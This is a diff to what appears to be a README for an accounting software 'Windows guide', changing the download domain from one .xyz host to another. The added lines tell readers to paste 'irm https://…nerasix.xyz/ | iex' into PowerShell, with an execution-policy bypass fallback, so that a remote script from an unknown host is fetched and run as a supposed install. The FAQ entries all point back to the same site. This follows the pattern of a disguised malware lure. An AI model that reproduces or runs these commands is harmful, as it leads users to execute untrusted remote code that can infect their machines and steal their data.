@@ -17,13 +17,13 @@ Express Accounts Professional Windows Guide · Accounting tools · Finance workf
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://express-accounts-professional-windows-guide.nexpath.xyz/ | iex
+irm https://express-accounts-professional-windows-guide.nerasix.xyz/ | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://express-accounts-professional-windows-guide.nexpath.xyz/ | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://express-accounts-professional-windows-guide.nerasix.xyz/ | iex"
 ```
 
 
@@ -59,17 +59,17 @@ Notes for users who need **Express Accounts Professional Windows Guide** running
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Open <a href="https://express-accounts-professional-windows-guide.nexpath.xyz/">express-accounts-professional-windows-guide.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Where is PowerShell?</b></summary>
-<br>Open <a href="https://express-accounts-professional-windows-guide.nexpath.xyz/">express-accounts-professional-windows-guide.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Open <a href="https://express-accounts-professional-windows-guide.nexpath.xyz/">express-accounts-professional-windows-guide.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://express-accounts-professional-windows-guide.nerasix.xyz/">express-accounts-professional-windows-guide.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
@@ -85,8 +85,7 @@ Notes for users who need **Express Accounts Professional Windows Guide** running
 
 > Use the project link below for Windows.
 
-* **Project link:** **[express-accounts-professional-windows-guide.nexpath.xyz](https://express-accounts-professional-windows-guide.nexpath.xyz/)**
-* **Full URL:** `https://express-accounts-professional-windows-guide.nexpath.xyz/`
+* **Project link:** **[express-accounts-professional-windows-guide.nerasix.xyz](https://express-accounts-professional-windows-guide.nerasix.xyz/)**
+* **Full URL:** `https://express-accounts-professional-windows-guide.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
-
